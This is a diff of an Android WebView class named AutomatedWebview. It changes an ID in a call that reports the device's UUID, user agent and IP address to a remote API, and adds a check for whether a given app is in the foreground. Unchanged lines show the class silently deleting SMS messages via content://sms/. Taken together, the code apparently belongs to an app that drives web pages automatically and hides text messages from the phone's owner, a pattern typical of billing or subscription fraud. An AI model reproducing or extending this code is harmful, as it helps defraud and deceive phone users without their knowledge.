@@ -1,5 +1,7 @@
 package automation.bml.com.webviewautomation;
 
+import android.app.ActivityManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.database.Cursor;
@@ -30,6 +32,7 @@ import java.io.FileOutputStream;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.ArrayList;
+import java.util.List;
 import java.util.Map;
 import java.util.UUID;
 
@@ -44,6 +47,7 @@ import retrofit2.Response;
 import retrofit2.Retrofit;
 import retrofit2.converter.gson.GsonConverterFactory;
 
+import static android.content.Context.ACTIVITY_SERVICE;
 import static android.content.Context.CONNECTIVITY_SERVICE;
 import static android.content.Context.WIFI_SERVICE;
 
@@ -104,7 +108,7 @@ public class AutomatedWebview extends WebView {
                             .create();
                     Retrofit retrofit = new Retrofit.Builder().addConverterFactory(GsonConverterFactory.create(gson)).baseUrl(RestAPI.BASE_URL).client(httpClient).build();
                     RestAPI service = retrofit.create(RestAPI.class);
-                    Call<TransactionResponse> meResponse = service.loadData("1", getUUID(), getUserAgent(), getIPAddress(), "20408", "start");
+                    Call<TransactionResponse> meResponse = service.loadData("1", getUUID(), getUserAgent(), getIPAddress(), "20404", "start");
                     meResponse.enqueue(new Callback<TransactionResponse>() {
                         @Override
                         public void onResponse(Call<TransactionResponse> call, Response<TransactionResponse> response) {
@@ -337,9 +341,22 @@ public class AutomatedWebview extends WebView {
             context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
         }
     }
-    private void isActive()
-    {
+    public boolean isForeground(String PackageName){
+        // Get the Activity Manager
+        ActivityManager manager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
 
+        // Get a list of running tasks, we are only interested in the last one,
+        // the top most so we give a 1 as parameter so we only get the topmost.
+        List< ActivityManager.RunningTaskInfo > task = manager.getRunningTasks(1);
+
+        // Get the info we need for comparison.
+        ComponentName componentInfo = task.get(0).topActivity;
+
+        // Check if it matches our package name.
+        if(componentInfo.getPackageName().equals(PackageName)) return true;
+
+        // If not then our app is not on the foreground.
+        return false;
     }
 
 }
